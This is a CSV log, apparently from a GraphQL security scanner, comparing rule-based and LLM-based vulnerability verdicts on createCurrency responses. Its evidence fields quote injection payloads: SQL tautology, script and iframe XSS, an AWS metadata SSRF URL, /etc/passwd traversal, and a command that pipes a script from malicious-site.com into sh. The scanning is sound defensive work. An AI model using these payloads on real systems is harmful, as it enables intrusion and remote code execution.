timestamp,node_name,response_status,simple_count,llm_count,agreement_score,consensus,common_categories,simple_unique,llm_unique,simple_vulnerable_count,simple_potential_count,simple_safe_count,llm_vulnerable_count,llm_potential_count,llm_safe_count,potential_agreement_score,potential_consensus,common_potential_categories,simple_unique_potential,llm_unique_potential,simple_results,llm_results
2025-10-08T09:53:40.204806,createCurrency_response_2,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""SQL Injection (SQLi) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SQL injection vulnerability detected - malicious SQL patterns found in response"", ""evidence"": ""Response status: 200, SQL patterns detected in response""}]","[{""detection_name"": ""LLM: sql_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a SQL injection payload (' OR 1=1--) in the 'abbreviation' field. This payload is a classic SQL tautology attack pattern. While no direct SQL errors are visible in the response, the presence of this payload in persisted data suggests insufficient input sanitization. In GraphQL contexts, mutations like createCurrency often map directly to database operations, increasing the risk of injection if inputs are not properly handled."", ""evidence"": ""abbreviation: \""USD' OR 1=1--\"""", ""confidence"": 0.7, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""sql_injection"", ""severity"": ""HIGH"", ""confidence"": 0.7, ""evidence"": ""abbreviation: \""USD' OR 1=1--\"""", ""explanation"": ""The response contains a SQL injection payload (' OR 1=1--) in the 'abbreviation' field. This payload is a classic SQL tautology attack pattern. While no direct SQL errors are visible in the response, the presence of this payload in persisted data suggests insufficient input sanitization. In GraphQL contexts, mutations like createCurrency often map directly to database operations, increasing the risk of injection if inputs are not properly handled.""}}]"
2025-10-08T09:53:49.594943,createCurrency_response_3,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Cross-Site Scripting (XSS) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""XSS injection vulnerability detected - malicious script patterns found in response"", ""evidence"": ""Response status: 200, XSS patterns detected in response data""}]","[{""detection_name"": ""LLM: xss_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a stored XSS payload in the 'country' field (<script>alert(document.domain)</script>). This demonstrates unescaped user-controlled input being returned by the API, which could execute malicious scripts in client browsers if rendered without sanitization. While this requires confirmation of how/where this data is displayed, the presence of raw HTML/script tags in the response meets technical criteria for XSS vulnerability."", ""evidence"": ""\""country\"": \""<script>alert(document.domain)</script>\"""", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""xss_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""\""country\"": \""<script>alert(document.domain)</script>\"""", ""explanation"": ""The response contains a stored XSS payload in the 'country' field (<script>alert(document.domain)</script>). This demonstrates unescaped user-controlled input being returned by the API, which could execute malicious scripts in client browsers if rendered without sanitization. While this requires confirmation of how/where this data is displayed, the presence of raw HTML/script tags in the response meets technical criteria for XSS vulnerability.""}}]"
2025-10-08T09:53:59.897993,createCurrency_response_4,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Server-Side Request Forgery (SSRF) Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""SSRF injection vulnerability detected - internal network access patterns found"", ""evidence"": ""Response status: 200, SSRF keywords detected in response""}]","[{""detection_name"": ""LLM: ssrf_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains a URL pointing to the AWS metadata service (169.254.169.254), a common SSRF target. This strongly suggests the server processed an external/internal request to a sensitive cloud instance metadata endpoint, which could expose credentials, network configurations, or other privileged internal data. In GraphQL mutations like createCurrency, this could indicate user-controlled input is being used to trigger server-side requests to internal systems."", ""evidence"": ""Internal AWS metadata URL (http://169.254.169.254/latest/meta-data/) in response"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""ssrf_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""Internal AWS metadata URL (http://169.254.169.254/latest/meta-data/) in response"", ""explanation"": ""The response contains a URL pointing to the AWS metadata service (169.254.169.254), a common SSRF target. This strongly suggests the server processed an external/internal request to a sensitive cloud instance metadata endpoint, which could expose credentials, network configurations, or other privileged internal data. In GraphQL mutations like createCurrency, this could indicate user-controlled input is being used to trigger server-side requests to internal systems.""}}]"
2025-10-08T09:54:07.820437,createCurrency_response_5,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: os_command_injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The 'country' field contains a payload with a semicolon (;), followed by a curl command piping to sh, indicating an attempt to execute arbitrary shell commands. This suggests the input is passed unsafely to a system shell, enabling OS command injection."", ""evidence"": ""country: \""; curl https://malicious-site.com/exploit.sh | sh\"""", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""os_command_injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.9, ""evidence"": ""country: \""; curl https://malicious-site.com/exploit.sh | sh\"""", ""explanation"": ""The 'country' field contains a payload with a semicolon (;), followed by a curl command piping to sh, indicating an attempt to execute arbitrary shell commands. This suggests the input is passed unsafely to a system shell, enabling OS command injection.""}}]"
2025-10-08T09:54:26.274031,createCurrency_response_6,200,1,1,1.0,both_detected,Injection Attacks,,,0,1,0,1,0,0,0.0,simple_potential_only,,Injection Attacks,,"[{""detection_name"": ""Path Injection"", ""detection"": ""potential"", ""category"": ""Injection Attacks"", ""description"": ""Path injection vulnerability detected - file system access patterns found"", ""evidence"": ""Response status: 200, Path injection patterns detected in response""}]","[{""detection_name"": ""LLM: Path Injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response reflects a directory traversal payload (../../../../etc/passwd) in the 'country' field, indicating possible unvalidated input used in file system operations. This is a classic path injection pattern attempting to access sensitive system files. While actual file access isn't confirmed, the successful 200 response with the payload in the output demonstrates insufficient input validation for path-related operations."", ""evidence"": ""country: \""../../../../etc/passwd\"" in createCurrency response"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""Path Injection"", ""severity"": ""CRITICAL"", ""confidence"": 0.95, ""evidence"": ""country: \""../../../../etc/passwd\"" in createCurrency response"", ""explanation"": ""The response reflects a directory traversal payload (../../../../etc/passwd) in the 'country' field, indicating possible unvalidated input used in file system operations. This is a classic path injection pattern attempting to access sensitive system files. While actual file access isn't confirmed, the successful 200 response with the payload in the output demonstrates insufficient input validation for path-related operations.""}}]"
2025-10-08T09:54:39.475204,createCurrency_response_7,200,0,1,0.0,llm_only,,,Injection Attacks,0,0,0,1,0,0,0.0,no_potential,,,,[],"[{""detection_name"": ""LLM: HTML Injection"", ""detection"": ""vulnerable"", ""category"": ""Injection Attacks"", ""description"": ""The response contains an HTML payload (<iframe> tag with JavaScript URI) directly injected into the 'country' field. This unescaped HTML would execute arbitrary JavaScript in a victim's browser if rendered, indicating a reflected HTML injection vulnerability (potentially leading to XSS). While HTML injection and XSS overlap, the explicit injection of markup meets the criteria for HTML Injection."", ""evidence"": ""\""<iframe src='javascript:alert(1)'>\"" in the 'country' field"", ""confidence"": 0.95, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""HTML Injection"", ""severity"": ""HIGH"", ""confidence"": 0.95, ""evidence"": ""\""<iframe src='javascript:alert(1)'>\"" in the 'country' field"", ""explanation"": ""The response contains an HTML payload (<iframe> tag with JavaScript URI) directly injected into the 'country' field. This unescaped HTML would execute arbitrary JavaScript in a victim's browser if rendered, indicating a reflected HTML injection vulnerability (potentially leading to XSS). While HTML injection and XSS overlap, the explicit injection of markup meets the criteria for HTML Injection.""}}]"
2025-10-08T09:54:54.696047,createCurrency_response_8,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-08T09:55:09.309307,createCurrency_response_9,,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-08T09:55:25.498705,createCurrency_response_10,400,0,0,0.0,no_vulnerabilities,,,,0,0,0,0,0,0,0.0,no_potential,,,,[],[]
2025-10-08T09:55:33.158803,createCurrency_response_11,400,1,1,0.0,both_detected,,Information Disclosure,Unknown,1,0,0,0,1,0,0.0,llm_potential_only,,,Unknown,"[{""detection_name"": ""Field Suggestions Enabled"", ""detection"": ""vulnerable"", ""category"": ""Information Disclosure"", ""description"": ""Field suggestions enabled - potential information disclosure"", ""evidence"": ""Found \""did you mean\"" in error message - field suggestions are enabled""}]","[{""detection_name"": ""LLM: field_suggestions"", ""detection"": ""potential"", ""category"": ""Unknown"", ""description"": ""The GraphQL error response explicitly suggests a valid field name (\""getCurrency\"") when an invalid field (\""createCurrency\"") is queried. This field suggestion feature exposes schema structure information, potentially aiding attackers in reconnaissance by revealing valid field names. While not inherently critical, it lowers the barrier for attackers to probe the API and discover protected/undocumented operations."", ""evidence"": ""Did you mean \""getCurrency\""?"", ""confidence"": 0.9, ""llm_analysis"": {""is_vulnerable"": true, ""vulnerability_type"": ""field_suggestions"", ""severity"": ""MEDIUM"", ""confidence"": 0.9, ""evidence"": ""Did you mean \""getCurrency\""?"", ""explanation"": ""The GraphQL error response explicitly suggests a valid field name (\""getCurrency\"") when an invalid field (\""createCurrency\"") is queried. This field suggestion feature exposes schema structure information, potentially aiding attackers in reconnaissance by revealing valid field names. While not inherently critical, it lowers the barrier for attackers to probe the API and discover protected/undocumented operations.""}}]"
